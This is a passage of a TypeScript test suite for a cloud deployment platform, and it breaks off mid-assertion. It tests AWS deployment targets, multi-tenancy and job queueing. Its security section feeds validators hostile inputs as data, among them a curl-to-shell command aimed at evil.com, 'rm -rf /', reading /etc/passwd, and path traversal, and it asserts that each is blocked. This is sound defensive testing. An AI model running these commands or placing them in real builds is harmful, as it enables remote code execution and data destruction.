// Force dry-run in automated unit tests so we don't provision real AWS buckets on test runs
process.env.FORCE_DRY_RUN_TEST = 'true';

import assert from 'assert';
import fs from 'fs';
import http from 'http';
import net from 'net';
import os from 'os';
import path from 'path';
import { PassThrough } from 'stream';
import { Express } from 'express';
import { resolveDeployer } from '../deployers';
import { CloudProviderNotAvailableError } from '../deployers/baseDeployer';
import { createApp } from '../server';
import { authService, detectAcademicStudentEmail } from '../services/authService';
import { DeploymentJobQueue } from '../services/deploymentJobQueue';
import { DeploymentManager } from '../services/deploymentManager';
import { isolatedBuildRunner } from '../services/isolatedBuilder';
import { RepositoryAnalyzer } from '../services/repositoryAnalyzer';
import { securityGuardrails } from '../services/securityGuardrails';
import { selfHealingEngine } from '../services/selfHealingEngine';
import { DeploymentStore } from '../store/deploymentStore';
import {
  resolveServerControlledDomain,
  sanitizeUserEnvVars,
  validateBuildOverrides,
  validateGitHubRepoUrl,
  validateSubdomain,
} from '../utils/validation';

async function runPhase1To3Tests(): Promise<void> {
  console.log('=== Repo2Cloud Phase 1, Phase 2 & Phase 3 Verification Suite ===\n');

  // Task 2: Validate GitHub URL
  console.log('1. Testing Phase 1 (GitHub URL validation)...');
  const validRepo = validateGitHubRepoUrl('https://github.com/example/vite-app');
  assert.strictEqual(validRepo.valid, true);
  assert.strictEqual(validRepo.data?.owner, 'example');
  assert.strictEqual(validRepo.data?.repo, 'vite-app');

  assert.strictEqual(validateGitHubRepoUrl('http://github.com/example/vite-app').valid, false);
  assert.strictEqual(validateGitHubRepoUrl('https://gitlab.com/example/vite-app').valid, false);
  console.log('   ✓ GitHub URL validation passed.');

  // Phase 1 & Phase 3: Multi-Target Recommendation Engine across all 4 AWS targets
  console.log('2. Testing Phase 1 & Phase 3 (Multi-Target Recommendation Engine across 4 AWS targets)...');
  const analyzer = new RepositoryAnalyzer();

  // Target 1: S3_CLOUDFRONT (Vite + React)
  const viteResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'vite.config.ts', 'index.html'],
    packageJson: {
      name: 'vite-demo',
      scripts: { build: 'npm run build' },
      dependencies: { react: '^18.3.0' },
      devDependencies: { vite: '^5.4.0' },
    },
  });
  assert.strictEqual(viteResult.framework, 'Vite + React');
  assert.strictEqual(viteResult.buildCommand, 'npm run build');
  assert.strictEqual(viteResult.outputDirectory, 'dist');
  assert.strictEqual(viteResult.recommendedTarget, 'S3_CLOUDFRONT');
  assert.strictEqual(viteResult.targetOptions?.length, 4, 'Expected all 4 target options in Phase 3');

  // Target 2: ECS_FARGATE (Express + Dockerfile)
  const ecsResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'Dockerfile', 'server.js'],
    dockerfileContent: 'FROM node:20-alpine\nEXPOSE 8080\nCMD ["node", "server.js"]',
    packageJson: {
      name: 'express-api',
      main: 'server.js',
      scripts: { start: 'node server.js' },
      dependencies: { express: '^4.19.2' },
    },
  });
  assert.strictEqual(ecsResult.recommendedTarget, 'ECS_FARGATE');
  assert.strictEqual(ecsResult.suggestedContainerPort, 8080);
  assert.strictEqual(ecsResult.suggestedHealthCheckPath, '/health');

  // Target 3: LAMBDA_API_GATEWAY (Serverless / Lambda handler)
  const lambdaResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'serverless.yml', 'handler.js'],
    packageJson: {
      name: 'serverless-api',
      dependencies: { 'serverless-http': '^3.2.0', express: '^4.19.2' },
    },
  });
  assert.strictEqual(lambdaResult.recommendedTarget, 'LAMBDA_API_GATEWAY');
  assert.strictEqual(lambdaResult.suggestedLambdaHandler, 'handler.handler');

  // Target 4: AMPLIFY (Next.js SSR without static export)
  const amplifyResult = analyzer.evaluateSnapshot({
    files: ['package.json', 'next.config.mjs'],
    packageJson: {
      name: 'nextjs-ssr',
      scripts: { build: 'next build', start: 'next start' },
      dependencies: { next: '^14.2.0', react: '^18.3.0' },
    },
  });
  assert.strictEqual(amplifyResult.recommendedTarget, 'AMPLIFY');
  console.log('   ✓ Phase 3 Multi-Target Recommendation Engine verified for S3_CLOUDFRONT, ECS_FARGATE, LAMBDA_API_GATEWAY, and AMPLIFY.');

  // Phase 2: Subdomain & Server-Controlled Base Domain Validation
  console.log('3. Testing Phase 2 (RFC-1123 subdomain & server-controlled domain validation)...');
  assert.strictEqual(validateSubdomain('my-app-2026').valid, true);
  assert.strictEqual(validateSubdomain('-bad-start').valid, false);
  assert.strictEqual(validateSubdomain('bad_underscore').valid, false);
  assert.strictEqual(validateSubdomain('api').valid, false, 'Reserved subdomain should be rejected');
  assert.strictEqual(validateSubdomain('a').valid, false, 'Too short subdomain should be rejected');

  assert.strictEqual(resolveServerControlledDomain('maas-fam.com').valid, true);
  assert.strictEqual(resolveServerControlledDomain('evil.com').valid, false);
  console.log('   ✓ RFC-1123 subdomain & server-controlled domain validation passed.');

  // Phase 1, Phase 2 & Phase 3 End-to-End Pipeline + Dynamic Overrides + 409 Conflict
  console.log('4. Testing Phase 1–3 Pipeline (Custom Subdomain + Dynamic Form Overrides + 409 Conflict)...');
  const tmpStoreFile = path.join(os.tmpdir(), `repo2cloud-phase3-test-${Date.now()}.json`);
  const store = new DeploymentStore(tmpStoreFile);
  const manager = new DeploymentManager(store);

  const startRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-app',
    target: 'S3_CLOUDFRONT',
    deploymentType: 'static',
    subdomain: 'technica-demo',
    domain: 'maas-fam.com',
    buildCommandOverride: 'npm run build',
    outputDirOverride: 'dist',
    envVars: { VITE_APP_ENV: 'staging' },
  });
  assert.strictEqual(startRes.ok, true);
  assert.strictEqual(startRes.deployment?.status, 'BUILDING');
  assert.strictEqual(startRes.deployment?.customHostname, 'technica-demo.maas-fam.com');
  assert.deepStrictEqual(startRes.deployment?.targetConfig?.envVarKeys, ['VITE_APP_ENV']);

  // Attempt duplicate subdomain deployment -> must return 409 Conflict immediately
  const duplicateRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/other-app',
    deploymentType: 'static',
    subdomain: 'technica-demo',
    domain: 'maas-fam.com',
  });
  assert.strictEqual(duplicateRes.ok, false);
  assert.strictEqual(duplicateRes.statusCode, 409, 'Duplicate subdomain must return 409 Conflict');
  console.log('   ✓ Atomic hostname reservation & 409 Conflict on duplicate subdomain verified.');

  const depId = startRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(depId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const completed = store.get(depId)!;
  assert.strictEqual(completed.status, 'LIVE');
  assert.strictEqual(completed.url, 'https://technica-demo.maas-fam.com');
  assert.ok(completed.infrastructureUrl?.endsWith('.cloudfront.net'));
  assert.ok(completed.resources.acmCertificateArn, 'Expected ACM certificate ARN in resources');
  assert.strictEqual(completed.resources.route53RecordName, 'technica-demo.maas-fam.com', 'Expected Route 53 Alias record in resources');

  // Test teardown releases the custom hostname reservation
  const delRes = await manager.deleteDeployment(depId);
  assert.strictEqual(delRes.ok, true);
  assert.strictEqual(store.isHostnameAvailable('technica-demo.maas-fam.com'), true, 'Hostname must be released after delete');
  console.log(`   ✓ End-to-end Phase 1–3 deployment & teardown verified (${completed.url}).`);

  // Phase 4: Containerized Full-Stack / Backend on ECS Fargate + ECR + ALB
  console.log('5. Testing Phase 4 (ECS Fargate + ECR + ALB + Auto-Dockerfile + Custom Subdomain)...');
  const ecsStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/express-docker-api',
    target: 'ECS_FARGATE',
    subdomain: 'express-api',
    domain: 'maas-fam.com',
    containerPort: 8080,
    healthCheckPath: '/health',
    envVars: { PORT: '8080', NODE_ENV: 'production' },
  });
  assert.strictEqual(ecsStartRes.ok, true);
  assert.strictEqual(ecsStartRes.deployment?.target, 'ECS_FARGATE');
  assert.strictEqual(ecsStartRes.deployment?.deploymentType, 'container');
  assert.strictEqual(ecsStartRes.deployment?.customHostname, 'express-api.maas-fam.com');

  const ecsDepId = ecsStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(ecsDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const ecsCompleted = store.get(ecsDepId)!;
  assert.strictEqual(ecsCompleted.status, 'LIVE', 'ECS_FARGATE deployment must reach LIVE status');
  assert.strictEqual(ecsCompleted.url, 'https://express-api.maas-fam.com');
  assert.ok(ecsCompleted.resources.ecrRepositoryUri, 'Expected ECR repository URI in resources');
  assert.ok(ecsCompleted.resources.ecsClusterName, 'Expected ECS cluster name in resources');
  assert.ok(ecsCompleted.resources.ecsServiceName, 'Expected ECS service name in resources');
  assert.ok(ecsCompleted.resources.ecsTaskDefinitionArn, 'Expected ECS task definition ARN in resources');
  assert.ok(ecsCompleted.resources.albTargetGroupArn, 'Expected ALB target group ARN in resources');
  assert.strictEqual(ecsCompleted.resources.route53RecordName, 'express-api.maas-fam.com');

  const ecsDelRes = await manager.deleteDeployment(ecsDepId);
  assert.strictEqual(ecsDelRes.ok, true);
  assert.strictEqual(ecsDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(store.isHostnameAvailable('express-api.maas-fam.com'), true, 'ECS hostname must be released after delete');
  console.log(`   ✓ End-to-end Phase 4 ECS Fargate deployment & teardown verified (${ecsCompleted.url}).`);

  // Phase 5: Serverless Backend / APIs on AWS Lambda + Amazon API Gateway v2
  console.log('6. Testing Phase 5 (AWS Lambda + API Gateway v2 HTTP API + PKZIP Bundle + Custom Subdomain)...');
  const lambdaStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/serverless-lambda-api',
    target: 'LAMBDA_API_GATEWAY',
    subdomain: 'serverless-api',
    domain: 'maas-fam.com',
    lambdaHandler: 'handler.handler',
    runtime: 'nodejs20.x',
    envVars: { STAGE: 'prod' },
  });
  assert.strictEqual(lambdaStartRes.ok, true);
  assert.strictEqual(lambdaStartRes.deployment?.target, 'LAMBDA_API_GATEWAY');
  assert.strictEqual(lambdaStartRes.deployment?.deploymentType, 'serverless');
  assert.strictEqual(lambdaStartRes.deployment?.customHostname, 'serverless-api.maas-fam.com');

  const lambdaDepId = lambdaStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(lambdaDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const lambdaCompleted = store.get(lambdaDepId)!;
  assert.strictEqual(lambdaCompleted.status, 'LIVE', 'LAMBDA_API_GATEWAY deployment must reach LIVE status');
  assert.strictEqual(lambdaCompleted.url, 'https://serverless-api.maas-fam.com');
  assert.ok(lambdaCompleted.resources.lambdaFunctionName, 'Expected Lambda function name in resources');
  assert.ok(lambdaCompleted.resources.lambdaRoleArn, 'Expected Lambda execution role ARN in resources');
  assert.ok(lambdaCompleted.resources.apiGatewayId, 'Expected API Gateway v2 ID in resources');
  assert.ok(
    lambdaCompleted.resources.apiGatewayEndpoint?.includes('.execute-api.'),
    'Expected API Gateway v2 endpoint in resources'
  );
  assert.strictEqual(lambdaCompleted.resources.route53RecordName, 'serverless-api.maas-fam.com');

  const lambdaDelRes = await manager.deleteDeployment(lambdaDepId);
  assert.strictEqual(lambdaDelRes.ok, true);
  assert.strictEqual(lambdaDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(
    store.isHostnameAvailable('serverless-api.maas-fam.com'),
    true,
    'Lambda custom hostname must be released after delete'
  );
  console.log(`   ✓ End-to-end Phase 5 Lambda + API Gateway deployment & teardown verified (${lambdaCompleted.url}).`);

  // Phase 6: Managed Full-Stack / Next.js SSR Hosting on AWS Amplify
  console.log('7. Testing Phase 6 (AWS Amplify Hosting + Auto amplify.yml + WEB_COMPUTE SSR + Custom Subdomain)...');
  const amplifyStartRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/nextjs-ssr-app',
    target: 'AMPLIFY',
    subdomain: 'nextjs-ssr',
    domain: 'maas-fam.com',
    branch: 'main',
    buildCommandOverride: 'npm run build',
    envVars: { NEXT_PUBLIC_API_URL: 'https://serverless-api.maas-fam.com' },
  });
  assert.strictEqual(amplifyStartRes.ok, true);
  assert.strictEqual(amplifyStartRes.deployment?.target, 'AMPLIFY');
  assert.strictEqual(amplifyStartRes.deployment?.deploymentType, 'amplify');
  assert.strictEqual(amplifyStartRes.deployment?.customHostname, 'nextjs-ssr.maas-fam.com');

  const amplifyDepId = amplifyStartRes.deployment!.deploymentId;
  for (let i = 0; i < 40; i++) {
    const current = store.get(amplifyDepId);
    if (current?.status === 'LIVE' || current?.status === 'FAILED') {
      break;
    }
    await new Promise((r) => setTimeout(r, 200));
  }

  const amplifyCompleted = store.get(amplifyDepId)!;
  assert.strictEqual(amplifyCompleted.status, 'LIVE', 'AMPLIFY deployment must reach LIVE status');
  assert.strictEqual(amplifyCompleted.url, 'https://nextjs-ssr.maas-fam.com');
  assert.ok(amplifyCompleted.resources.amplifyAppId, 'Expected AWS Amplify App ID in resources');
  assert.strictEqual(amplifyCompleted.resources.amplifyBranchName, 'main', 'Expected AWS Amplify branch name in resources');
  assert.ok(
    amplifyCompleted.infrastructureUrl?.endsWith('.amplifyapp.com'),
    'Expected underlying *.amplifyapp.com URL in infrastructureUrl'
  );
  assert.strictEqual(amplifyCompleted.resources.route53RecordName, 'nextjs-ssr.maas-fam.com');

  const amplifyDelRes = await manager.deleteDeployment(amplifyDepId);
  assert.strictEqual(amplifyDelRes.ok, true);
  assert.strictEqual(amplifyDelRes.deployment?.status, 'DELETED');
  assert.strictEqual(
    store.isHostnameAvailable('nextjs-ssr.maas-fam.com'),
    true,
    'Amplify custom hostname must be released after delete'
  );
  console.log(`   ✓ End-to-end Phase 6 AWS Amplify deployment & teardown verified (${amplifyCompleted.url}).`);

  // Phase 7: Build Isolation, Security Guardrails & Cost/Resource Limits
  console.log('8. Testing Phase 7 (Command Injection, Path Traversal, Secret Stripping, Symlink Escape & Quotas)...');

  // 8a. Command injection in buildCommandOverride must be blocked
  const cmdInj1 = validateBuildOverrides({
    buildCommandOverride: 'npm run build; curl https://evil.com/shell.sh | sh',
  });
  assert.strictEqual(cmdInj1.valid, false, 'Command chaining with ; must be blocked');

  const cmdInj2 = validateBuildOverrides({
    buildCommandOverride: 'npm run $(whoami)',
  });
  assert.strictEqual(cmdInj2.valid, false, 'Subshell $(...) must be blocked');

  const cmdInj3 = validateBuildOverrides({
    buildCommandOverride: 'bash -c "cat /etc/passwd"',
  });
  assert.strictEqual(cmdInj3.valid, false, 'Arbitrary shell binary must be blocked');

  const safeCmd = validateBuildOverrides({
    buildCommandOverride: 'npm run build',
    outputDirOverride: 'dist',
    healthCheckPath: '/health',
    lambdaHandler: 'index.handler',
    containerPort: 8080,
  });
  assert.strictEqual(safeCmd.valid, true, 'Standard build overrides must be allowed');

  // 8b. Path traversal in outputDirOverride must be blocked
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '../../etc' }).valid,
    false,
    'Relative path traversal (..) must be blocked'
  );
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '/etc/passwd' }).valid,
    false,
    'Absolute path (/etc/passwd) must be blocked'
  );
  assert.strictEqual(
    validateBuildOverrides({ outputDirOverride: '.git/config' }).valid,
    false,
    '.git directory exposure must be blocked'
  );

  // 8c. AWS_* and GITHUB_* secret env vars must be blocked
  assert.strictEqual(
    sanitizeUserEnvVars({ AWS_SECRET_ACCESS_KEY: 'leak' }).valid,
    false
  );
  assert.strictEqual(
    sanitizeUserEnvVars({ AWS_CUSTOM_CREDENTIAL: 'leak' }).valid,
    false
  );
  assert.strictEqual(
    sanitizeUserEnvVars({ GITHUB_ACCESS_TOKEN: 'leak' }).valid,
    false
  );

  // 8d. Symlink escape outside workspace must be blocked
  const symlinkTestDir = path.join(os.tmpdir(), `repo2cloud-symlink-test-${Date.now()}`);
  fs.mkdirSync(symlinkTestDir, { recursive: true });
  const escapeLinkPath = path.join(symlinkTestDir, 'escaped-secret.txt');
  fs.symlinkSync('/etc/hosts', escapeLinkPath);
  let symlinkBlocked = false;
  try {
    isolatedBuildRunner.verifyWorkspaceSafety(symlinkTestDir);
  } catch (err: unknown) {
    if (err instanceof Error && err.message.includes('Symlink escape blocked')) {
      symlinkBlocked = true;
    }
  } finally {
    fs.rmSync(symlinkTestDir, { recursive: true, force: true });
  }
  assert.strictEqual(symlinkBlocked, true, 'Symlink pointing outside workspace must be blocked');

  // 8e. DeploymentManager rejects malicious overrides with 400 Bad Request
  const badDeployRes = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-app',
    target: 'S3_CLOUDFRONT',
    buildCommandOverride: 'npm run build && rm -rf /',
  });
  assert.strictEqual(badDeployRes.ok, false);
  assert.strictEqual(badDeployRes.statusCode, 400);

  // 8f. Security guardrails status snapshot
  const secStatus = securityGuardrails.getStatus(store);
  assert.strictEqual(secStatus.isolation.awsCredentialsStripped, true);
  assert.strictEqual(secStatus.isolation.symlinkEscapeProtection, true);
  assert.strictEqual(secStatus.isolation.commandInjectionFilter, true);
  console.log('   ✓ Phase 7 build isolation, command/path filters, symlink escape protection & quotas verified.');

  // Phase 8: Self-Healing Engine & Real-Time Platform Observability Metrics
  console.log('9. Testing Phase 8 (Self-Healing Failure Diagnosis, Auto-Remediation & Platform Observability Metrics)...');
  const diagEmptyOut = selfHealingEngine.diagnoseFailure(
    'Build finished but output directory "dist/" is empty.',
    'BUILDING'
  );
  assert.strictEqual(diagEmptyOut.errorCode, 'EMPTY_OUTPUT_DIRECTORY');
  assert.strictEqual(diagEmptyOut.autoRemediable, true);
  assert.strictEqual(diagEmptyOut.patchedAnalysis?.outputDirectory, '.');

  const diagIam = selfHealingEngine.diagnoseFailure(
    'The role defined for the function cannot be assumed by Lambda.',
    'DEPLOYING'
  );
  assert.strictEqual(diagIam.errorCode, 'TRANSIENT_CLOUD_PROPAGATION');
  assert.strictEqual(diagIam.autoRemediable, true);

  const metrics = selfHealingEngine.computeMetrics(store);
  assert.strictEqual(metrics.totalDeployments, 4, 'Expected all 4 target deployments recorded in metrics');
  assert.strictEqual(metrics.successRatePercent, 100, 'Expected 100% success rate across all 4 targets');
  assert.strictEqual(metrics.byTarget.S3_CLOUDFRONT, 1);
  assert.strictEqual(metrics.byTarget.ECS_FARGATE, 1);
  assert.strictEqual(metrics.byTarget.LAMBDA_API_GATEWAY, 1);
  assert.strictEqual(metrics.byTarget.AMPLIFY, 1);

  if (fs.existsSync(tmpStoreFile)) {
    fs.unlinkSync(tmpStoreFile);
  }
  console.log('   ✓ Phase 8 Self-Healing diagnosis & platform observability metrics verified across all 4 AWS targets.\n');
  console.log('ALL PHASE 1, PHASE 2, PHASE 3, PHASE 4, PHASE 5, PHASE 6, PHASE 7 & PHASE 8 TESTS PASSED!\n');
}

/**
 * In-process Express HTTP harness so integration, JWT, RBAC, IDOR, and SSE streaming tests
 * run deterministically inside sandboxed CI environments without requiring TCP port binding.
 */
async function invokeApp(
  expressApp: Express,
  method: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE',
  urlPath: string,
  opts?: {
    body?: unknown;
    headers?: Record<string, string>;
  }
): Promise<{
  status: number;
  headers: http.OutgoingHttpHeaders;
  text: string;
  json: <T = Record<string, unknown>>() => T;
}> {
  return new Promise((resolve, reject) => {
    const mockSocket = Object.assign(new PassThrough(), {
      remoteAddress: '127.0.0.1',
    }) as unknown as net.Socket;

    const req = new http.IncomingMessage(mockSocket);
    req.method = method;
    req.url = urlPath;

    const rawBody = opts?.body !== undefined ? JSON.stringify(opts.body) : undefined;
    const lowerHeaders: Record<string, string> = {};
    if (opts?.headers) {
      for (const [k, v] of Object.entries(opts.headers)) {
        lowerHeaders[k.toLowerCase()] = v;
      }
    }
    if (rawBody !== undefined) {
      if (!lowerHeaders['content-type']) {
        lowerHeaders['content-type'] = 'application/json';
      }
      lowerHeaders['content-length'] = String(Buffer.byteLength(rawBody, 'utf8'));
    }
    req.headers = lowerHeaders;

    if (rawBody !== undefined) {
      req.push(Buffer.from(rawBody, 'utf8'));
    }
    req.push(null);

    const res = new http.ServerResponse(req);
    const chunks: Buffer[] = [];

    res.flushHeaders = () => {};
    res.write = ((chunk: unknown, encoding?: unknown, cb?: unknown) => {
      if (chunk) {
        chunks.push(
          Buffer.isBuffer(chunk)
            ? chunk
            : Buffer.from(
                String(chunk),
                typeof encoding === 'string' ? (encoding as BufferEncoding) : 'utf8'
              )
        );
      }
      if (typeof encoding === 'function') encoding();
      else if (typeof cb === 'function') cb();
      return true;
    }) as typeof res.write;

    res.end = ((chunk?: unknown, encoding?: unknown, cb?: unknown) => {
      if (chunk && typeof chunk !== 'function') {
        chunks.push(
          Buffer.isBuffer(chunk)
            ? chunk
            : Buffer.from(
                String(chunk),
                typeof encoding === 'string' ? (encoding as BufferEncoding) : 'utf8'
              )
        );
      }
      if (typeof chunk === 'function') chunk();
      else if (typeof encoding === 'function') encoding();
      else if (typeof cb === 'function') cb();

      const text = Buffer.concat(chunks).toString('utf8');
      resolve({
        status: res.statusCode,
        headers: res.getHeaders(),
        text,
        json: <T = Record<string, unknown>>() => JSON.parse(text) as T,
      });
      return res;
    }) as typeof res.end;

    try {
      expressApp(req, res);
    } catch (err) {
      reject(err);
    }
  });
}

async function runPhase9Sprint1Tests(): Promise<void> {
  console.log('=== DeployMate Phase 9 · Sprint 1 Verification Suite (DM-901 to DM-905) ===\n');

  const tmpDbPath = path.join(os.tmpdir(), `deploymate-phase9-sprint1-${Date.now()}.json`);
  const store = new DeploymentStore(tmpDbPath);
  const queue = new DeploymentJobQueue({
    maxConcurrency: 2,
    maxQueueBacklog: 20,
    jobTimeoutMs: 15_000,
  });
  const manager = new DeploymentManager(store, queue);
  const testApp = createApp(store, manager, queue);

  // ==========================================================================
  // DM-901 (#1): Cloud-Agnostic Core Refactor & Multi-Cloud Registry
  // ==========================================================================
  console.log('10. Testing DM-901 (Multi-Cloud Provider + Archetype Registry & 501 Coming Soon)...');

  // TC-901-01: Resolve all 4 AWS workload archetypes
  assert.strictEqual(resolveDeployer('AWS', 'STATIC_EDGE').target, 'S3_CLOUDFRONT');
  assert.strictEqual(resolveDeployer('AWS', 'CONTAINER_SERVICE').target, 'ECS_FARGATE');
  assert.strictEqual(resolveDeployer('AWS', 'SERVERLESS_FUNC').target, 'LAMBDA_API_GATEWAY');
  assert.strictEqual(resolveDeployer('AWS', 'SSR_WEB').target, 'AMPLIFY');

  let gcpErrThrown = false;
  try {
    resolveDeployer('GCP', 'CONTAINER_SERVICE');
  } catch (err) {
    if (err instanceof CloudProviderNotAvailableError) {
      gcpErrThrown = true;
      assert.strictEqual(err.statusCode, 501);
      assert.strictEqual(err.code, 'CLOUD_PROVIDER_COMING_SOON');
      assert.strictEqual(err.plannedTarget, 'GCP_CLOUD_RUN');
    }
  }
  assert.strictEqual(gcpErrThrown, true, 'Expected CloudProviderNotAvailableError for GCP');

  // TC-901-02: Legacy HTTP POST /api/deploy without cloudProvider defaults to AWS + STATIC_EDGE + DEPLOYMATE_MANAGED
  const legacyHttpRes = await invokeApp(testApp, 'POST', '/api/deploy', {
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      target: 'S3_CLOUDFRONT',
    },
  });
  assert.strictEqual(legacyHttpRes.status, 202);
  const legacyBody = legacyHttpRes.json<{
    deploymentId: string;
    cloudProvider: string;
    archetype: string;
    tenancy: string;
  }>();
  assert.strictEqual(legacyBody.cloudProvider, 'AWS');
  assert.strictEqual(legacyBody.archetype, 'STATIC_EDGE');
  assert.strictEqual(legacyBody.tenancy, 'DEPLOYMATE_MANAGED');

  // Wait for legacy deployment to finish so queue is idle for subsequent load tests
  for (let i = 0; i < 40; i++) {
    const cur = store.get(legacyBody.deploymentId);
    if (cur?.status === 'LIVE' || cur?.status === 'FAILED') break;
    await new Promise((r) => setTimeout(r, 150));
  }
  assert.strictEqual(store.get(legacyBody.deploymentId)?.status, 'LIVE');

  // TC-901-03: GCP and AZURE HTTP requests return structured 501 without leaking hostname reservations
  const gcpHttpRes = await invokeApp(testApp, 'POST', '/api/deploy', {
    body: {
      repoUrl: 'https://github.com/example/express-docker-api',
      cloudProvider: 'GCP',
      archetype: 'CONTAINER_SERVICE',
      subdomain: 'gcp-not-leaked',
      domain: 'maas-fam.com',
    },
  });
  assert.strictEqual(gcpHttpRes.status, 501);
  const gcpBody = gcpHttpRes.json<{
    code: string;
    plannedTarget: string;
    remediation: string;
  }>();
  assert.strictEqual(gcpBody.code, 'CLOUD_PROVIDER_COMING_SOON');
  assert.strictEqual(gcpBody.plannedTarget, 'GCP_CLOUD_RUN');
  assert.ok(gcpBody.remediation.includes('Phase 10'));
  assert.strictEqual(
    store.isHostnameAvailable('gcp-not-leaked.maas-fam.com'),
    true,
    '501 rejection must not leak subdomain reservation'
  );

  const azureHttpRes = await invokeApp(testApp, 'POST', '/api/deploy', {
    body: {
      repoUrl: 'https://github.com/example/vite-app',
      cloudProvider: 'AZURE',
      archetype: 'STATIC_EDGE',
    },
  });
  assert.strictEqual(azureHttpRes.status, 501);
  assert.strictEqual(
    azureHttpRes.json<{ plannedTarget: string }>().plannedTarget,
    'AZURE_STATIC_FRONTDOOR'
  );
  console.log('   ✓ DM-901 (TC-901-01, TC-901-02, TC-901-03) passed.');

  // ==========================================================================
  // DM-902 (#2): Multi-Tenant Persistence Layer & Atomic Hostname Reservation
  // ==========================================================================
  console.log('11. Testing DM-902 (20-Way Atomic Hostname Race, Tenant Isolation & Reload Persistence)...');

  // Verify PostgreSQL DDL migration file exists with UNIQUE hostname constraint
  const ddlPath = path.resolve(__dirname, '../store/postgresSchema.sql');
  assert.strictEqual(fs.existsSync(ddlPath), true, 'Expected postgresSchema.sql migration file');
  const ddlText = fs.readFileSync(ddlPath, 'utf8');
  assert.ok(ddlText.includes('CREATE TABLE IF NOT EXISTS reserved_hostnames'));
  assert.ok(/hostname\s+VARCHAR\(255\)\s+PRIMARY KEY/.test(ddlText));

  // TC-902-01: 20-way concurrent reserveHostname race -> exactly 1 winner, 19 conflicts
  const raceAttempts = await Promise.all(
    Array.from({ length: 20 }, (_, idx) =>
      Promise.resolve().then(() =>
        store.reserveHostname('race-winner.maas-fam.com', `dep_race_${idx}`)
      )
    )
  );
  const winners = raceAttempts.filter((r) => r.reserved);
  const losers = raceAttempts.filter((r) => !r.reserved);
  assert.strictEqual(winners.length, 1, 'Exactly 1 concurrent caller may reserve the hostname');
  assert.strictEqual(losers.length, 19, 'Remaining 19 callers must receive conflict');
  store.releaseHostname('race-winner.maas-fam.com');

  // TC-902-02 & TC-902-03: Tenant-scoped listByOrg / getForOrg + disk reload survival
  const sessionOrg1 = authService.loginOrRegisterUser(
    { email: 'tenant1@acme.io', displayName: 'Tenant One' },
    store
  );
  const sessionOrg2 = authService.loginOrRegisterUser(
    { email: 'tenant2@globex.io', displayName: 'Tenant Two' },
    store
  );
  const org1Id = sessionOrg1.defaultOrganization.orgId;
  const org2Id = sessionOrg2.defaultOrganization.orgId;

  const depOrg1 = await manager.startDeployment({
    repoUrl: 'https://github.com/example/vite-app',
    orgId: org1Id,
    createdByUserId: sessionOrg1.user.userId,
  });
  const depOrg2 = await manager.startDeployment({
    repoUrl: 'https://github.com/example/express-docker-api',
    target: 'ECS_FARGATE',
    orgId: org2Id,
    createdByUserId: sessionOrg2.user.userId,
  });
  assert.strictEqual(depOrg1.ok, true);
  assert.strictEqual(depOrg2.ok, true);

  for (let i = 0; i < 40; i++) {
    const d1 = store.get(depOrg1.deployment!.deploymentId);
    const d2 = store.get(depOrg2.deployment!.deploymentId);
    if (d1?.status === 'LIVE' && d2?.status === 'LIVE') break;
    await new Promise((r) => setTimeout(r, 150));
  }

  const org1List = store.listByOrg(org1Id);
  assert.strictEqual(org1List.length, 1);
  assert.strictEqual(org1List[0].deploymentId, depOrg1.deployment!.deploymentId);
  assert.strictEqual(
    store.getForOrg(depOrg2.deployment!.deploymentId, org1Id),
    undefined,
    'Cross-org getForOrg lookup must return undefined'
  );

  // TC-902-03: Reload persistence from disk
  const reloadedStore = new DeploymentStore(tmpDbPath);
  assert.strictEqual(reloadedStore.listByOrg(org1Id).length, 1);
  assert.strictEqual(reloadedStore.listByOrg(org2Id).length, 1);
  assert.strictEqual(reloadedStore.getUserByEmail('tenant1@acme.io')?.userId, sessionOrg1.user.userId);
  console.log('   ✓ DM-902 (TC-902-01, TC-902-02, TC-902-03) passed.');

  // ==========================================================================
  // DM-903 (#3): Bounded Async Worker Queue, Timeout Watchdog & Real-Time SSE
  // ==========================================================================
  console.log('12. Testing DM-903 (Bounded Queue FIFO Concurrency, Timeout Watchdog & Real-Time SSE)...');

  // TC-903-01: Submit 6 concurrent deployments against queue(maxConcurrency=2)
  const batchResponses = await Promise.all(
    Array.from({ length: 6 }, (_, idx) =>
      manager.startDeployment({
        repoUrl: `https://github.com/example/vite-batch-${idx}`,
        target: 'S3_CLOUDFRONT',
        orgId: org1Id,
      })
    )
  );
  assert.strictEqual(batchResponses.every((r) => r.ok), true, 'All 6 burst jobs must be accepted');
  const buildingCount = batchResponses.filter((r) => r.deployment?.status === 'BUILDING').length;
  const queuedCount = batchResponses.filter((r) => r.deployment?.status === 'QUEUED').length;
  assert.strictEqual(buildingCount, 2, 'First 2 jobs must acquire active worker slots (BUILDING)');
  assert.strictEqual(queuedCount, 4, 'Remaining 4 jobs must enter QUEUED state');

  // Wait for all 6 queued/building deployments to drain to LIVE
  for (let i = 0; i < 80; i++) {
    const allLive = batchResponses.every(
      (r) => store.get(r.deployment!.deploymentId)?.status === 'LIVE'
    );
    if (allLive) break;
    await new Promise((r) => setTimeout(r, 150));
  }
  for (const r of batchResponses) {
    assert.strictEqual(
